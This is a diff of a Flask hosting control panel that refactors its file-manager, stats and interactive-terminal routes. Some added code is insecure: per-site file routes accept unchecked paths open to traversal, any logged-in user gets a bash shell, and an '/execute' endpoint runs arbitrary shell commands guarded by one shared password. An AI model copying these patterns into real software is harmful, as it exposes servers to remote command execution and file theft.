+        return jsonify({'error': 'No file'}), 400
+    file = request.files['file']
+    if file.filename == '':
+        return jsonify({'error': 'Empty'}), 400
+    rel_path = request.form.get('path', '')
+    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", rel_path)
+    os.makedirs(folder, exist_ok=True)
+    filename = secure_filename(file.filename)
+    file.save(os.path.join(folder, filename))
+    return jsonify({'success': True})
+
+@app.route('/website/<int:website_id>/file/delete', methods=['POST'])
+@login_required
+def website_delete_file(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Unauthorized'}), 401
+    path = request.json.get('path', '').strip()
+    if not path:
+        return jsonify({'error': 'Path required'}), 400
+    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
+    if not os.path.exists(full):
+        return jsonify({'error': 'Not found'}), 404
+    if os.path.isdir(full):
+        shutil.rmtree(full)
+    else:
+        os.remove(full)
+    return jsonify({'success': True})
+
+@app.route('/website/<int:website_id>/file/rename', methods=['POST'])
+@login_required
+def website_rename_file(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        return jsonify({'error': 'Unauthorized'}), 401
     data = request.json
-    username = data.get('username', '').strip()
-    password = data.get('password', '')
-    role = data.get('role', 'user')
-    expiry = data.get('expiry', '')
-    if not username or not password: return jsonify({'error': 'Username and password required'}), 400
-    if get_user_by_username(username): return jsonify({'error': 'User exists'}), 400
-    with get_db() as conn:
-        try:
-            conn.execute('INSERT INTO users (username, email, password_hash, role, plan, expires_at) VALUES (?, ?, ?, ?, ?, ?)',
-                         (username, username+'@hosting.local', generate_password_hash(password), role, 'free', parse_expiry(expiry)))
-            conn.commit()
-        except:
-            return jsonify({'error': 'Failed to create'}), 500
+    old_path = data.get('old_path', '').strip()
+    new_name = data.get('new_name', '').strip()
+    if not old_path or not new_name:
+        return jsonify({'error': 'Required'}), 400
+    base = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
+    old_full = os.path.join(base, old_path)
+    if not os.path.exists(old_full):
+        return jsonify({'error': 'Not found'}), 404
+    new_full = os.path.join(os.path.dirname(old_full), new_name)
+    if os.path.exists(new_full):
+        return jsonify({'error': 'Already exists'}), 400
+    os.rename(old_full, new_full)
     return jsonify({'success': True})
 
-@app.route('/api/users/<username>', methods=['PUT'])
-def api_update_user(username):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
-    user = get_user_by_username(username)
-    if not user: return jsonify({'error': 'Not found'}), 404
-    data = request.json
-    with get_db() as conn:
-        if 'password' in data:
-            conn.execute('UPDATE users SET password_hash = ?, session_version = session_version + 1 WHERE username = ?',
-                         (generate_password_hash(data['password']), username))
-        if 'limit' in data:
-            pass # we don't have limit in users table, we use plan
-        if 'banned' in data:
-            conn.execute('UPDATE users SET status = ? WHERE username = ?', ('banned' if data['banned'] else 'active', username))
-        if 'expiry' in data:
-            conn.execute('UPDATE users SET expires_at = ? WHERE username = ?', (parse_expiry(data['expiry']), username))
-        conn.commit()
-    return jsonify({'success': True})
+@app.route('/website/<int:website_id>/file/download', methods=['GET'])
+@login_required
+def website_download_file(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        abort(404)
+    path = request.args.get('path', '').strip()
+    if not path:
+        abort(400)
+    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
+    if not os.path.exists(full) or os.path.isdir(full):
+        abort(404)
+    return send_file(full, as_attachment=True)
 
-@app.route('/api/users/<username>', methods=['DELETE'])
-def api_delete_user(username):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
-    if username == session['username']: return jsonify({'error': 'Cannot delete self'}), 400
-    delete_user_account(username)
-    return jsonify({'success': True})
-
-# ---------- PROXY ROUTE (WEBSITES) ----------
+# ---------- WEBSITE PROXY ----------
 @app.route('/<slug>/', defaults={'path': ''})
 @app.route('/<slug>/<path:path>')
 def proxy_website(slug, path):
@@ -1191,7 +1809,8 @@ def proxy_website(slug, path):
     if website['status'] != 'running':
         return render_template_string(ERROR_TEMPLATE, message="Website is not running", slug=slug), 503
     port = website['allocated_port']
-    if not port: return "Port not allocated", 500
+    if not port:
+        return "Port not allocated", 500
     target_url = f"http://localhost:{port}/{path}"
     headers = {k: v for k, v in request.headers if k.lower() != 'host'}
     try:
@@ -1203,19 +1822,16 @@ def proxy_website(slug, path):
     except Exception as e:
         return f"Proxy error: {str(e)}", 500
 
-# ---------- STATS API (OWNER) ----------
+# ---------- SYSTEM STATS API ----------
 @app.route('/api/stats')
+@admin_required
 def api_stats():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    user = get_user_by_id(session['user_id'])
-    if user['role'] != 'admin': return jsonify({'error': 'Forbidden'}), 403
-
     # Main uptime
     main_uptime_seconds = int(time.time() - MAIN_START_TIME) if MAIN_START_TIME else 0
 
     # Internal websites/bots runtime
     with get_db() as conn:
-        rows = conn.execute('SELECT id, total_runtime_seconds, last_start_time, status, type FROM websites').fetchall()
+        rows = conn.execute('SELECT id, total_runtime_seconds, last_start_time, status FROM websites').fetchall()
     total_internal_seconds = 0
     for row in rows:
         total_internal_seconds += row['total_runtime_seconds'] or 0
@@ -1224,7 +1840,8 @@ def api_stats():
                 start_dt = datetime.fromisoformat(row['last_start_time'].replace(' ', 'T'))
                 elapsed = int((datetime.now() - start_dt).total_seconds())
                 total_internal_seconds += elapsed
-            except: pass
+            except:
+                pass
 
     # Render API External Services
     render_services = []
@@ -1248,6 +1865,7 @@ def api_stats():
                     'name': svc.get('name', 'Unnamed'),
                     'type': svc.get('type', 'web'),
                     'status': status,
+                    'uptime_hours': 0
                 })
 
     offset_hours = float(get_config('total_hours_offset', '0'))
@@ -1297,10 +1915,8 @@ def api_stats():
     })
 
 @app.route('/api/set_offset', methods=['POST'])
+@admin_required
 def set_offset():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    user = get_user_by_id(session['user_id'])
-    if user['role'] != 'admin': return jsonify({'error': 'Forbidden'}), 403
     data = request.json
     try:
         offset = float(data.get('offset', 0))
@@ -1309,116 +1925,22 @@ def set_offset():
     set_config('total_hours_offset', str(offset))
     return jsonify({'success': True, 'new_offset': offset})
 
-# ---------- TERMINAL (from app.py) ----------
-terminal_sessions = {}
-class TerminalSession:
-    def __init__(self):
-        self.process = None
-        self.output_queue = queue.Queue()
-        self.read_thread = None
-        self.running = False
-        self.master = None
-    def start(self):
-        if self.process and self.process.poll() is None: return
-        master, slave = pty.openpty()
-        self.process = subprocess.Popen(['/bin/bash'] if os.name != 'nt' else ['cmd.exe'],
-                                        stdin=slave, stdout=slave, stderr=slave,
-                                        universal_newlines=False, bufsize=0,
-                                        preexec_fn=os.setsid if os.name != 'nt' else None)
-        os.close(slave)
-        self.master = master
-        self.running = True
-        self.read_thread = threading.Thread(target=self._reader, daemon=True)
-        self.read_thread.start()
-    def _reader(self):
-        while self.running and self.process.poll() is None:
-            try:
-                rlist, _, _ = select.select([self.master], [], [], 0.1)
-                if rlist:
-                    data = os.read(self.master, 4096)
-                    if data: self.output_queue.put(data)
-            except: break
-    def write(self, data):
-        if self.process and self.process.poll() is None:
-            os.write(self.master, data.encode('utf-8') if isinstance(data, str) else data)
-    def read_output(self):
-        out = b''
-        while not self.output_queue.empty():
-            out += self.output_queue.get_nowait()
-        return out.decode('utf-8', errors='replace')
-    def is_running(self):
-        return self.process and self.process.poll() is None
-    def stop(self):
-        self.running = False
-        if self.process:
-            try:
-                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
-            except: self.process.terminate()
-            self.process.wait()
-            self.process = None
-        if self.master:
-            try: os.close(self.master)
-            except: pass
-            self.master = None
-
-def get_terminal_session(username):
-    if username not in terminal_sessions:
-        sess = TerminalSession()
-        sess.start()
-        terminal_sessions[username] = sess
-    return terminal_sessions[username]
-
-@app.route('/api/terminal/start', methods=['POST'])
-def terminal_start():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    sess = get_terminal_session(session['username'])
-    if not sess.is_running(): sess.start()
-    return jsonify({'success': True})
-
-@app.route('/api/terminal/send', methods=['POST'])
-def terminal_send():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    data = request.json
-    input_data = data.get('data', '')
-    sess = terminal_sessions.get(session['username'])
-    if not sess or not sess.is_running():
-        return jsonify({'error': 'Terminal not running'}), 400
-    sess.write(input_data + '\n')
-    return jsonify({'success': True})
-
-@app.route('/api/terminal/read', methods=['GET'])
-def terminal_read():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    sess = terminal_sessions.get(session['username'])
-    if not sess:
-        return jsonify({'output': '', 'running': False})
-    output = sess.read_output()
-    running = sess.is_running()
-    return jsonify({'output': output, 'running': running})
-
-@app.route('/api/terminal/stop', methods=['POST'])
-def terminal_stop():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    sess = terminal_sessions.get(session['username'])
-    if sess:
-        sess.stop()
-        terminal_sessions.pop(session['username'], None)
-    return jsonify({'success': True})
-
-# ---------- FILE MANAGER (owner only) ----------
+# ---------- FILE MANAGER (admin system) ----------
 def safe_path(path):
     abs_path = os.path.abspath(os.path.join(BASE_DIR, path))
-    if not abs_path.startswith(BASE_DIR): return None
+    if not abs_path.startswith(BASE_DIR):
+        return None
     return abs_path
 
 @app.route('/api/files', methods=['GET'])
+@admin_required
 def list_files():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
     path = request.args.get('path', '')
     abs_path = safe_path(path)
-    if abs_path is None: return jsonify({'error': 'Invalid path'}), 400
-    if not os.path.exists(abs_path): return jsonify({'error': 'Path does not exist'}), 404
+    if abs_path is None:
+        return jsonify({'error': 'Invalid path'}), 400
+    if not os.path.exists(abs_path):
+        return jsonify({'error': 'Path does not exist'}), 404
     if os.path.isfile(abs_path):
         return jsonify({
             'type': 'file',
@@ -1445,34 +1967,40 @@ def list_files():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/files/delete', methods=['POST'])
+@admin_required
 def delete_file():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
     data = request.json
     path = data.get('path', '')
     abs_path = safe_path(path)
-    if abs_path is None: return jsonify({'error': 'Invalid path'}), 400
-    if not os.path.exists(abs_path): return jsonify({'error': 'Path does not exist'}), 404
+    if abs_path is None:
+        return jsonify({'error': 'Invalid path'}), 400
+    if not os.path.exists(abs_path):
+        return jsonify({'error': 'Path does not exist'}), 404
     try:
-        if os.path.isdir(abs_path): shutil.rmtree(abs_path)
-        else: os.remove(abs_path)
+        if os.path.isdir(abs_path):
+            shutil.rmtree(abs_path)
+        else:
+            os.remove(abs_path)
         return jsonify({'success': True})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/files/rename', methods=['POST'])
+@admin_required
 def rename_file():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
     data = request.json
     old_path = data.get('old_path', '')
     new_name = data.get('new_name', '').strip()
-    if not new_name: return jsonify({'error': 'New name required'}), 400
+    if not new_name:
+        return jsonify({'error': 'New name required'}), 400
     abs_old = safe_path(old_path)
-    if abs_old is None: return jsonify({'error': 'Invalid path'}), 400
-    if not os.path.exists(abs_old): return jsonify({'error': 'Path does not exist'}), 404
+    if abs_old is None:
+        return jsonify({'error': 'Invalid path'}), 400
+    if not os.path.exists(abs_old):
+        return jsonify({'error': 'Path does not exist'}), 404
     new_abs = os.path.join(os.path.dirname(abs_old), new_name)
-    if os.path.exists(new_abs): return jsonify({'error': 'Name already exists'}), 400
+    if os.path.exists(new_abs):
+        return jsonify({'error': 'Name already exists'}), 400
     try:
         os.rename(abs_old, new_abs)
         return jsonify({'success': True})
@@ -1480,184 +2008,148 @@ def rename_file():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/files/download', methods=['GET'])
+@admin_required
 def download_file():
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
     path = request.args.get('path', '')
     abs_path = safe_path(path)
-    if abs_path is None: return jsonify({'error': 'Invalid path'}), 400
+    if abs_path is None:
+        return jsonify({'error': 'Invalid path'}), 400
     if not os.path.exists(abs_path) or os.path.isdir(abs_path):
         return jsonify({'error': 'File not found'}), 404
     return send_file(abs_path, as_attachment=True)
 
-# ---------- BUILD LOGS SSE ----------
-@app.route('/deploy/<int:website_id>/logs')
-def deploy_logs_sse(website_id):
-    if 'user_id' not in session: return "Unauthorized", 401
-    w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: abort(404)
-    with get_db() as conn:
-        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
-    if not dep: return "No deployment", 404
-    log_file = dep['log_file'] or os.path.join(LOG_FOLDER, f"deploy_{dep['id']}.log")
-    def generate():
-        if os.path.exists(log_file):
-            with open(log_file, 'r') as f:
-                for line in f:
-                    yield f"data: {line.strip()}\n\n"
-        last_size = os.path.getsize(log_file) if os.path.exists(log_file) else 0
-        while True:
-            time.sleep(0.5)
-            if os.path.exists(log_file):
-                cur = os.path.getsize(log_file)
-                if cur > last_size:
-                    with open(log_file, 'r') as f:
-                        f.seek(last_size)
-                        for line in f:
-                            yield f"data: {line.strip()}\n\n"
-                    last_size = cur
-            with get_db() as conn:
-                status = conn.execute('SELECT status FROM deployments WHERE id = ?', (dep['id'],)).fetchone()
-            if status and status['status'] in ('success', 'failed'):
-                yield f"data: [REFRESH]\n\n"
-                yield f"data: [SYSTEM] Completed with status: {status['status']}\n\n"
+# ---------- INTERACTIVE TERMINAL ----------
+terminal_sessions = {}
+
+class TerminalSession:
+    def __init__(self):
+        self.process = None
+        self.output_queue = queue.Queue()
+        self.read_thread = None
+        self.running = False
+
+    def start(self):
+        if self.process is not None and self.process.poll() is None:
+            return
+        master, slave = pty.openpty()
+        self.process = subprocess.Popen(
+            ['/bin/bash'] if os.name != 'nt' else ['cmd.exe'],
+            stdin=slave,
+            stdout=slave,
+            stderr=slave,
+            universal_newlines=False,
+            bufsize=0,
+            preexec_fn=os.setsid if os.name != 'nt' else None
+        )
+        os.close(slave)
+        self.master = master
+        self.running = True
+        self.read_thread = threading.Thread(target=self._reader)
+        self.read_thread.daemon = True
+        self.read_thread.start()
+
+    def _reader(self):
+        while self.running and self.process.poll() is None:
+            try:
+                rlist, _, _ = select.select([self.master], [], [], 0.1)
+                if rlist:
+                    data = os.read(self.master, 4096)
+                    if data:
+                        self.output_queue.put(data)
+            except Exception:
                 break
-    return Response(stream_with_context(generate()), mimetype='text/event-stream')
 
-# ---------- WEBSITE FILES VIEWER (simplified) ----------
-@app.route('/website/<int:website_id>/files')
-def files(website_id):
-    if 'user_id' not in session: return redirect(url_for('index'))
-    w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: abort(404)
-    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
-    if not os.path.exists(folder): abort(404)
-    items = []
-    for root, dirs, files_list in os.walk(folder):
-        rel = os.path.relpath(root, folder)
-        if rel == '.': rel = ''
-        for f in files_list:
-            full = os.path.join(root, f)
-            items.append({'name': f, 'path': os.path.join(rel, f).replace('\\', '/'), 'is_dir': False, 'size': os.path.getsize(full)})
-        for d in dirs:
-            items.append({'name': d, 'path': os.path.join(rel, d).replace('\\', '/'), 'is_dir': True})
-    return render_template_string(FILES_TEMPLATE, website=w, items=items)
+    def write(self, data):
+        if self.process and self.process.poll() is None:
+            os.write(self.master, data.encode('utf-8') if isinstance(data, str) else data)
 
-@app.route('/website/<int:website_id>/edit', methods=['GET', 'POST'])
-def edit_file(website_id):
-    if 'user_id' not in session: return redirect(url_for('index'))
-    w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: abort(404)
-    file_path = request.args.get('path', '').strip()
-    if not file_path: return "No path", 400
-    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", file_path)
-    if not os.path.exists(full) or not os.path.isfile(full): abort(404)
-    if request.method == 'GET':
-        with open(full, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-        return render_template_string(EDIT_TEMPLATE, website=w, file_path=file_path, content=content)
-    else:
-        with open(full, 'w', encoding='utf-8') as f:
-            f.write(request.form.get('content', ''))
-        return redirect(url_for('files', website_id=website_id))
+    def read_output(self):
+        output = b''
+        while not self.output_queue.empty():
+            output += self.output_queue.get_nowait()
+        return output.decode('utf-8', errors='replace')
 
-@app.route('/website/<int:website_id>/file/upload', methods=['POST'])
-def upload_file_website(website_id):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
-    if 'file' not in request.files: return jsonify({'error': 'No file'}), 400
-    file = request.files['file']
-    if file.filename == '': return jsonify({'error': 'Empty'}), 400
-    rel_path = request.form.get('path', '')
-    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", rel_path)
-    os.makedirs(folder, exist_ok=True)
-    filename = secure_filename(file.filename)
-    file.save(os.path.join(folder, filename))
+    def is_running(self):
+        return self.process is not None and self.process.poll() is None
+
+    def stop(self):
+        self.running = False
+        if self.process:
+            try:
+                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
+            except:
+                self.process.terminate()
+            self.process.wait()
+            self.process = None
+        if self.master:
+            try:
+                os.close(self.master)
+            except:
+                pass
+            self.master = None
+
+def get_terminal_session(username):
+    if username not in terminal_sessions:
+        sess = TerminalSession()
+        sess.start()
+        terminal_sessions[username] = sess
+    return terminal_sessions[username]
+
+@app.route('/api/terminal/start', methods=['POST'])
+@login_required
+def terminal_start():
+    username = session['username']
+    sess = get_terminal_session(username)
+    if not sess.is_running():
+        sess.start()
     return jsonify({'success': True})
 
-@app.route('/website/<int:website_id>/file/delete', methods=['POST'])
-def delete_file_website(website_id):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
-    path = request.json.get('path', '').strip()
-    if not path: return jsonify({'error': 'Path required'}), 400
-    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
-    if not os.path.exists(full): return jsonify({'error': 'Not found'}), 404
-    if os.path.isdir(full): shutil.rmtree(full)
-    else: os.remove(full)
-    return jsonify({'success': True})
-
-@app.route('/website/<int:website_id>/file/rename', methods=['POST'])
-def rename_file_website(website_id):
-    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
-    w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
+@app.route('/api/terminal/send', methods=['POST'])
+@login_required
+def terminal_send():
+    username = session['username']
     data = request.json
-    old_path = data.get('old_path', '').strip()
-    new_name = data.get('new_name', '').strip()
-    if not old_path or not new_name: return jsonify({'error': 'Required'}), 400
-    base = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
-    old_full = os.path.join(base, old_path)
-    if not os.path.exists(old_full): return jsonify({'error': 'Not found'}), 404
-    new_full = os.path.join(os.path.dirname(old_full), new_name)
-    if os.path.exists(new_full): return jsonify({'error': 'Already exists'}), 400
-    os.rename(old_full, new_full)
+    input_data = data.get('data', '')
+    sess = terminal_sessions.get(username)
+    if not sess or not sess.is_running():
+        return jsonify({'error': 'Terminal not running'}), 400
+    sess.write(input_data + '\n')
     return jsonify({'success': True})
 
-@app.route('/website/<int:website_id>/file/download', methods=['GET'])
-def download_file_website(website_id):
-    if 'user_id' not in session: return redirect(url_for('index'))
-    w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: abort(404)
-    path = request.args.get('path', '').strip()
-    if not path: abort(400)
-    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
-    if not os.path.exists(full) or os.path.isdir(full): abort(404)
-    return send_file(full, as_attachment=True)
+@app.route('/api/terminal/read', methods=['GET'])
+@login_required
+def terminal_read():
+    username = session['username']
+    sess = terminal_sessions.get(username)
+    if not sess:
+        return jsonify({'output': '', 'running': False})
+    output = sess.read_output()
+    running = sess.is_running()
+    return jsonify({'output': output, 'running': running})
 
-@app.route('/website/<int:website_id>/build')
-def build_logs_page(website_id):
-    if 'user_id' not in session: return redirect(url_for('index'))
-    w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: abort(404)
-    with get_db() as conn:
-        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
-    return render_template_string(BUILD_LOGS_TEMPLATE, website=w, no_logs=not dep)
+@app.route('/api/terminal/stop', methods=['POST'])
+@login_required
+def terminal_stop():
+    username = session['username']
+    sess = terminal_sessions.get(username)
+    if sess:
+        sess.stop()
+        terminal_sessions.pop(username, None)
+    return jsonify({'success': True})
 
-@app.route('/website/<int:website_id>/logs')
-def view_logs(website_id):
-    if 'user_id' not in session: return redirect(url_for('index'))
-    w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: abort(404)
-    with get_db() as conn:
-        logs = conn.execute('SELECT * FROM logs WHERE website_id = ? ORDER BY timestamp DESC LIMIT 200', (website_id,)).fetchall()
-    log_file = os.path.join(LOG_FOLDER, f"website_{website_id}.log") if w['type'] == 'website' else os.path.join(LOG_FOLDER, f"bot_{website_id}.log")
-    file_log = ''
-    if os.path.exists(log_file):
-        with open(log_file, 'r', errors='ignore') as f:
-            file_log = f.read()
-    deploy_log = ''
-    with get_db() as conn:
-        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
-    if dep:
-        dep_log_file = dep['log_file'] or os.path.join(LOG_FOLDER, f"deploy_{dep['id']}.log")
-        if os.path.exists(dep_log_file):
-            with open(dep_log_file, 'r', errors='ignore') as f:
-                deploy_log = f.read()
-    error_logs = [log for log in logs if log['log_type'] == 'error']
-    error_log_text = '\n'.join([f"{log['timestamp']} {log['log_text']}" for log in error_logs])
-    return render_template_string(LOGS_TEMPLATE, website=w, logs=logs, file_log=file_log, deploy_log=deploy_log, error_log_text=error_log_text)
-
-@app.route('/website/<int:website_id>/deployments')
-def deployment_history(website_id):
-    if 'user_id' not in session: return redirect(url_for('index'))
-    w = get_website_by_id(website_id)
-    if not w or w['owner_id'] != session['user_id']: abort(404)
-    with get_db() as conn:
-        deployments = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY started_at DESC', (website_id,)).fetchall()
-    return render_template_string(DEPLOYMENTS_TEMPLATE, website=w, deployments=deployments)
+# ---------- OLD TERMINAL (kept for compatibility) ----------
+@app.route('/execute', methods=['POST'])
+def execute():
+    data = request.json
+    if data.get('password') != PASSWORD:
+        return jsonify({"output": "Access Denied"})
+    try:
+        result = subprocess.check_output(data['command'], shell=True, stderr=subprocess.STDOUT, timeout=600)
+        return jsonify({"output": result.decode('utf-8')})
+    except subprocess.TimeoutExpired:
+        return jsonify({"output": "Command timed out"})
+    except Exception as e:
+        return jsonify({"output": str(e)})
 
 # ---------- TEMPLATES ----------
 ERROR_TEMPLATE = """<!DOCTYPE html>
@@ -1665,477 +2157,6 @@ ERROR_TEMPLATE = """<!DOCTYPE html>
 <style>body{background:#0a0e1a;color:#fff;font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh}.card{background:rgba(255,255,255,0.05);padding:40px;border-radius:20px;text-align:center}h1{color:#ff4757}a{color:#00e5ff;text-decoration:none}</style>
 </head><body><div class="card"><h1>{{ message }}</h1><p>Slug: {{ slug }}</p><a href="/dashboard">← Dashboard</a></div></body></html>"""
 
-LOGIN_TEMPLATE = """
-<!DOCTYPE html>
-<html><head><title>Login</title>
-<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh}.card{background:rgba(255,255,255,0.06);padding:40px;border-radius:20px;width:320px;text-align:center}input{width:100%;padding:10px;margin:8px 0;background:#1a1a2e;border:1px solid #333;border-radius:8px;color:#fff}.btn{width:100%;padding:10px;background:#00e5ff;border:none;border-radius:8px;color:#000;font-weight:bold;cursor:pointer}.error{color:#ff4757}.link{color:#00e5ff;text-decoration:none}</style>
-</head><body><div class="card"><h2>Login</h2>
-<form method="POST" action="/login">
-<input type="text" name="username" placeholder="Username" required>
-<input type="password" name="password" placeholder="Password" required>
-<button class="btn" type="submit">Login</button>
-</form>
-<div class="error">{{ error }}</div>
-<a class="link" href="/register">Register</a>
-</div></body></html>
-"""
-
-REGISTER_TEMPLATE = """
-<!DOCTYPE html>
-<html><head><title>Register</title>
-<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh}.card{background:rgba(255,255,255,0.06);padding:40px;border-radius:20px;width:320px;text-align:center}input{width:100%;padding:10px;margin:8px 0;background:#1a1a2e;border:1px solid #333;border-radius:8px;color:#fff}.btn{width:100%;padding:10px;background:#7a00ff;border:none;border-radius:8px;color:#fff;font-weight:bold;cursor:pointer}.error{color:#ff4757}.link{color:#00e5ff;text-decoration:none}</style>
-</head><body><div class="card"><h2>Register</h2>
-<form method="POST">
-<input type="text" name="username" placeholder="Username" required>
-<input type="email" name="email" placeholder="Email" required>
-<input type="password" name="password" placeholder="Password" required>
-<button class="btn" type="submit">Register</button>
-</form>
-<div class="error">{{ error }}</div>
-<a class="link" href="/">Login</a>
-</div></body></html>
-"""
-
-# =========================================================================
-# ========================== DASHBOARD TEMPLATE ============================
-# =========================================================================
-DASHBOARD_TEMPLATE = """
-<!DOCTYPE html>
-<html>
-<head><title>Dashboard - Yuvicodex</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:linear-gradient(135deg,#0a0e1a 0%,#0d1a2a 100%);color:#fff;font-family:'Segoe UI',sans-serif;padding:20px;min-height:100vh}
-.container{max-width:1400px;margin:auto}
-.header{display:flex;justify-content:space-between;align-items:center;padding:15px 25px;background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border-radius:20px;border:1px solid rgba(255,255,255,0.08);margin-bottom:30px;flex-wrap:wrap;gap:10px}
-.header h1{font-size:1.8rem;background:linear-gradient(135deg,#00e5ff,#7a00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.user-badge{display:flex;align-items:center;gap:15px;flex-wrap:wrap}
-.badge{background:rgba(0,229,255,0.15);padding:4px 14px;border-radius:50px;font-size:0.8rem;border:1px solid rgba(0,229,255,0.2)}
-.plan-badge{background:linear-gradient(135deg,#7a00ff,#00e5ff);padding:2px 12px;border-radius:50px;font-size:0.7rem;font-weight:700}
-.btn-logout{color:#ff4757;text-decoration:none;font-weight:600;padding:8px 20px;border:1px solid #ff4757;border-radius:50px;transition:.3s}
-.btn-logout:hover{background:#ff4757;color:#fff}
-.stats-btn{background:rgba(0,229,255,0.15);border:1px solid #00e5ff;color:#00e5ff;padding:8px 20px;border-radius:50px;cursor:pointer;transition:.3s;font-weight:600}
-.stats-btn:hover{background:#00e5ff;color:#000}
-.tabs{display:flex;gap:10px;margin-bottom:20px;border-bottom:1px solid rgba(255,255,255,0.1);padding-bottom:10px}
-.tab-btn{background:transparent;border:none;color:#888;font-size:1.2rem;font-weight:700;padding:10px 20px;cursor:pointer;transition:.3s;border-radius:10px}
-.tab-btn:hover{color:#fff;background:rgba(255,255,255,0.05)}
-.tab-btn.active{color:#00e5ff;background:rgba(0,229,255,0.1)}
-.tab-content{display:none}
-.tab-content.active{display:block}
-.upload-box{background:rgba(255,255,255,0.04);backdrop-filter:blur(10px);border:2px dashed rgba(255,255,255,0.2);border-radius:25px;padding:30px;margin-bottom:30px;transition:.3s;position:relative}
-.upload-box.dragover{border-color:#00e5ff;background:rgba(0,229,255,0.05)}
-.upload-box:hover{border-color:#00e5ff}
-.upload-box h3{font-size:1.3rem;margin-bottom:15px;color:#ddd}
-.upload-box input[type="file"]{width:100%;padding:10px;margin:8px 0;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:15px;color:#fff;outline:none}
-.btn{background:linear-gradient(135deg,#7a00ff,#00e5ff);border:none;padding:12px 40px;border-radius:50px;color:#fff;font-size:1rem;font-weight:700;cursor:pointer;transition:.3s}
-.btn:hover{transform:scale(1.05);box-shadow:0 0 40px rgba(0,229,255,0.2)}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:25px;margin-top:20px}
-.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.07);border-radius:20px;padding:25px;transition:.3s}
-.card:hover{transform:translateY(-5px);border-color:rgba(0,229,255,0.2)}
-.card-title{font-size:1.2rem;font-weight:700;color:#fff}
-.card-slug{color:#889;font-size:0.9rem;margin:5px 0}
-.card-port{color:#889;font-size:0.8rem}
-.status-badge{display:inline-block;padding:4px 14px;border-radius:50px;font-size:0.75rem;font-weight:600;margin:10px 0}
-.status-running{background:rgba(0,229,255,0.15);color:#00e5ff;border:1px solid rgba(0,229,255,0.2)}
-.status-stopped{background:rgba(255,71,87,0.15);color:#ff4757;border:1px solid rgba(255,71,87,0.2)}
